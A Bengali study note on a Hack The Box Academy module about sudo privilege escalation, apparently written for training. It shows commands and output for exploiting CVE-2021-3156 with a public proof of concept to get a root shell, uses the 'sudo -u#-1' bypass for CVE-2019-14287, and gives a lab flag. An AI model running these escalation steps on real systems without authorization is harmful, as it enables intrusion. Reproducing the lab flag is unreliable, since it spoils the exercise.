# Sudo - [LINK](https://academy.hackthebox.com/app/module/51/section/1590)



লিনাক্স (Linux) বা ম্যাকওএস (macOS) এর মতো ইউনিক্স-ভিত্তিক অপারেটিং সিস্টেমে `sudo` একটি অত্যন্ত গুরুত্বপূর্ণ প্রোগ্রাম। এর কাজ হলো একজন সাধারণ ইউজারকে অন্য কোনো ইউজারের (বেশিরভাগ ক্ষেত্রেই অ্যাডমিনিস্ট্রেটর বা রুট) ক্ষমতা ব্যবহার করে কোনো প্রসেস বা কমান্ড রান করার সুযোগ দেওয়া।

সিস্টেমের নিরাপত্তা বজায় রাখার জন্য এটি একটি সুরক্ষা স্তর হিসেবে কাজ করে, যাতে অননুমোদিত কেউ সিস্টেমের কোনো ক্ষতি করতে না পারে। সিস্টেমে কে বা কোন গ্রুপ কী ধরনের প্রিভিলেজ (ক্ষমতা) নিয়ে কোন প্রোগ্রাম রান করতে পারবে, তা `/etc/sudoers` নামের একটি ফাইলে নির্দিষ্ট করে দেওয়া থাকে।

**Sudoers ফাইল চেক করা:**

```bash
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'

```

*(এই কমান্ডটি মূলত ফাইলের ভেতরের কমেন্ট এবং ফাঁকা লাইনগুলো বাদ দিয়ে শুধু কাজের লাইনগুলো দেখাবে)।*

**আউটপুট উদাহরণ:**

```text
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d

```

উপরের আউটপুটে দেখা যাচ্ছে `cry0l1t3` ইউজারটি যেকোনো ইউজারের ক্ষমতা নিয়ে `/usr/bin/id` কমান্ডটি চালাতে পারবে।

## ১. Sudo Vulnerability: CVE-2021-3156 (বাফার ওভারফ্লো)

Sudo এর একটি অত্যন্ত বিখ্যাত দুর্বলতা হলো **CVE-2021-3156** (যাকে Baron Samedit ও বলা হয়)। এটি একটি হিপ-বেসড বাফার ওভারফ্লো (heap-based buffer overflow) বাগ। সবচেয়ে অবাক করা বিষয় হলো, এই বাগটি আবিষ্কার হওয়ার আগে প্রায় ১০ বছর ধরে সিস্টেমে লুকিয়ে ছিল!

**আক্রান্ত ভার্সনগুলো:**

* 1.8.31 - Ubuntu 20.04
* 1.8.27 - Debian 10
* 1.9.2 - Fedora 33
* এবং আরও কিছু ভার্সন।

**Sudo এর ভার্সন চেক করার কমান্ড:**
টার্গেট সিস্টেমে ঢোকার পর প্রথমেই চেক করে নিতে হবে যে সিস্টেমের sudo ভার্সনটি এই অ্যাটাকের জন্য দুর্বল কিনা।

```bash
cry0l1t3@nix02:~$ sudo -V | head -n1

Sudo version 1.8.31

```

ভার্সনটি 1.8.31, অর্থাৎ এটি এই অ্যাটাকের জন্য উপযুক্ত।

### এক্সপ্লয়টেশন (অ্যাটাক করার পদ্ধতি)

এই দুর্বলতাটি কাজে লাগানোর জন্য ইন্টারনেটে আগে থেকেই তৈরি করা এক্সপ্লয়ট (Proof-Of-Concept বা PoC) পাওয়া যায়। আমরা ব্ল্যাসটি (blasty) এর তৈরি করা একটি PoC ব্যবহার করব।

**ধাপ ১: এক্সপ্লয়ট ডাউনলোড এবং কম্পাইল করা**
যদি টার্গেট মেশিনে ইন্টারনেট থাকে, তবে সরাসরি সেখানেই গিটক্লোন করে কম্পাইল করা যায়।

```bash
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

```

**ধাপ ২: অপারেটিং সিস্টেমের ভার্সন বের করা**
এক্সপ্লয়টটি রান করার আগে জানতে হবে টার্গেট মেশিনটি কোন অপারেটিং সিস্টেম ব্যবহার করছে, কারণ এক্সপ্লয়টটি রান করার সময় সঠিক অপশনটি সিলেক্ট করতে হবে।

```bash
cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"

```

এখানে আমরা দেখতে পাচ্ছি এটি "Ubuntu 20.04.1"।

**ধাপ ৩: এক্সপ্লয়ট রান করা এবং রুট শেল নেওয়া**
আমরা যদি শুধু `./sudo-hax-me-a-sandwich` রান করি, তবে এটি একটি মেনু দেখাবে। সেই মেনু অনুযায়ী "Ubuntu 20.04.1" এর আইডি হলো `1`। এবার এই আইডি দিয়ে কমান্ড রান করতে হবে:

```bash
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

```

**ফলাফল:**

```text
** pray for your rootshell.. **

# id
uid=0(root) gid=0(root) groups=0(root)

```

সফলভাবে আমরা সিস্টেমের রুট (Root) পারমিশন পেয়ে গেলাম!

## ২. Sudo Policy Bypass: CVE-2019-14287 (পলিসি বাইপাস)

২০১৯ সালে Sudo এর আরেকটি মজার কিন্তু মারাত্মক দুর্বলতা পাওয়া যায়, যার নাম **CVE-2019-14287**। Sudo এর **1.8.28** ভার্সনের নিচের সব ভার্সনেই এই সমস্যাটি ছিল।

এই দুর্বলতার সবচেয়ে বড় শর্ত (Prerequisite) হলো: ইউজারের `/etc/sudoers` ফাইলে নির্দিষ্ট কোনো কমান্ড রান করার পারমিশন থাকতে হবে।

**ধাপ ১: Sudo পারমিশন চেক করা**

```bash
cry0l1t3@nix02:~$ sudo -l

```

আউটপুট:

```text
User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id

```

অর্থাৎ, ইউজারটি যেকোনো ইউজারের ক্ষমতা নিয়ে `/usr/bin/id` কমান্ড চালাতে পারবে।

**দুর্বলতাটি ঠিক কোথায়?**
Sudo কমান্ড রান করার সময় আমরা চাইলে ইউজারের নামের বদলে তার আইডি (ID) দিয়েও কমান্ড রান করতে পারি। ইউজারের আইডিগুলো `/etc/passwd` ফাইলে থাকে।
যেমন: `cry0l1t3` ইউজারের আইডি হলো `1005`। আর সিস্টেমের রুট (Root) ইউজারের আইডি সবসময় `0` থাকে।

বাগটি হলো, আমরা যদি ইউজার আইডির জায়গায় একটি নেগেটিভ নাম্বার বা **-1** দিই (`#-1`), তখন সিস্টেম ভুল করে এটিকে **0** (অর্থাৎ রুট ইউজার) হিসেবে ধরে নেয়!

**ধাপ ২: অ্যাটাক এক্সিকিউট করা**
যেহেতু আমাদের `/usr/bin/id` কমান্ডটি (বা যেকোনো অনুমোদিত কমান্ড) রান করার পারমিশন আছে, আমরা `-u` (user) ফ্লাগ ব্যবহার করে `-1` আইডি দিয়ে কমান্ডটি চালাব।

```bash
cry0l1t3@nix02:~$ sudo -u#-1 id

```

**ফলাফল:**

```text
root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)

```



## LAB


* **Check sudo version:** `sudo -V` → `1.8.21p2`

* **Sudo rule:**

  ```text
  (ALL, !root) /bin/ncdu
  ```

  → Can run `ncdu` as any user **except root**.

* **Exploit:** CVE-2019-14287 abuses a special UID value with vulnerable sudo versions:

  ```bash
  sudo -u#-1 /bin/ncdu
  ```

* Sudo incorrectly handles the UID and runs `ncdu` as **root** despite the `!root` restriction.

* Verify:

  ```bash
  whoami
  ```

  → `root`

* **Flag:**

  ```text
  HTB{SuD0_e5c4l47i0n_1id}
  ```
